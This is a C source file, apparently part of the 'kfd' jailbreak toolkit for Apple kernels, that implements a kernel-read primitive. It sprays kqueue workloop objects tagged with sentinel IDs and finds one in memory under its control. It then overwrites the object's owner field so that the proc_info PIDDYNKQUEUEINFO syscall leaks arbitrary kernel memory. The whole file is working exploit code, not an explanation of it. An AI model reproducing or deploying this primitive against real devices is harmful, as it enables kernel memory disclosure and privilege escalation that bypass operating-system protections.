//
//  kread_kqueue_workloop_ctl.c
//  Bootstrap
//
//  Created by Chris Coding on 1/5/24.
//

#include <stdio.h>
#include "kread_kqueue_workloop_ctl.h"

const uint64_t kread_kqueue_workloop_ctl_sentinel = 0x1122334455667788;

void kread_kqueue_workloop_ctl_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = 100000;
    kfd->kread.krkw_object_size = sizeof(struct kqworkloop);
}

void kread_kqueue_workloop_ctl_allocate(struct kfd* kfd, uint64_t id)
{
    struct kqueue_workloop_params params = {
        .kqwlp_version = (int32_t)(sizeof(params)),
        .kqwlp_flags = KQ_WORKLOOP_CREATE_SCHED_PRI,
        .kqwlp_id = id + kread_kqueue_workloop_ctl_sentinel,
        .kqwlp_sched_pri = 1,
    };

    uint64_t cmd = KQ_WORKLOOP_CREATE;
    uint64_t options = 0;
    uint64_t addr = (uint64_t)(&params);
    uintptr_t sz = (uintptr_t)(params.kqwlp_version);
    assert_bsd(syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
}

bool kread_kqueue_workloop_ctl_search(struct kfd* kfd, uint64_t object_uaddr)
{
    volatile struct kqworkloop* kqwl = (volatile struct kqworkloop*)(object_uaddr);
    uint64_t sentinel_min = kread_kqueue_workloop_ctl_sentinel;
    uint64_t sentinel_max = sentinel_min + kfd->kread.krkw_allocated_id;

    uint16_t kqwl_state = kqwl->kqwl_kqueue.kq_state;
    uint64_t kqwl_dynamicid = kqwl->kqwl_dynamicid;

    if ((kqwl_state == (KQ_KEV_QOS | KQ_WORKLOOP | KQ_DYNAMIC)) &&
        (kqwl_dynamicid >= sentinel_min) &&
        (kqwl_dynamicid < sentinel_max)) {
        uint64_t object_id = kqwl_dynamicid - sentinel_min;
        kfd->kread.krkw_object_id = object_id;
        return true;
    }

    return false;
}

void kread_kqueue_workloop_ctl_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size)
{
    kread_from_method(uint64_t, kread_kqueue_workloop_ctl_kread_u64);
}

void kread_kqueue_workloop_ctl_find_proc(struct kfd* kfd)
{
    volatile struct kqworkloop* kqwl = (volatile struct kqworkloop*)(kfd->kread.krkw_object_uaddr);
    kfd->info.kaddr.current_proc = kqwl->kqwl_kqueue.kq_p;
}

void kread_kqueue_workloop_ctl_deallocate(struct kfd* kfd, uint64_t id)
{
    struct kqueue_workloop_params params = {
        .kqwlp_version = (int32_t)(sizeof(params)),
        .kqwlp_id = id + kread_kqueue_workloop_ctl_sentinel,
    };

    uint64_t cmd = KQ_WORKLOOP_DESTROY;
    uint64_t options = 0;
    uint64_t addr = (uint64_t)(&params);
    uintptr_t sz = (uintptr_t)(params.kqwlp_version);
    assert_bsd(syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
}

void kread_kqueue_workloop_ctl_free(struct kfd* kfd)
{
    kread_kqueue_workloop_ctl_deallocate(kfd, kfd->kread.krkw_object_id);
}

uint64_t kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, uint64_t kaddr)
{
    volatile struct kqworkloop* kqwl = (volatile struct kqworkloop*)(kfd->kread.krkw_object_uaddr);
    uint64_t old_kqwl_owner = kqwl->kqwl_owner;
    uint64_t new_kqwl_owner = kaddr - dynamic_info(thread__thread_id);
    kqwl->kqwl_owner = new_kqwl_owner;

    struct kqueue_dyninfo data = {};
    int32_t callnum = PROC_INFO_CALL_PIDDYNKQUEUEINFO;
    int32_t pid = kfd->info.env.pid;
    uint32_t flavor = PROC_PIDDYNKQUEUE_INFO;
    uint64_t arg = kfd->kread.krkw_object_id + kread_kqueue_workloop_ctl_sentinel;
    uint64_t buffer = (uint64_t)(&data);
    int32_t buffersize = (int32_t)(sizeof(struct kqueue_dyninfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    kqwl->kqwl_owner = old_kqwl_owner;
    return data.kqdi_owner;
}
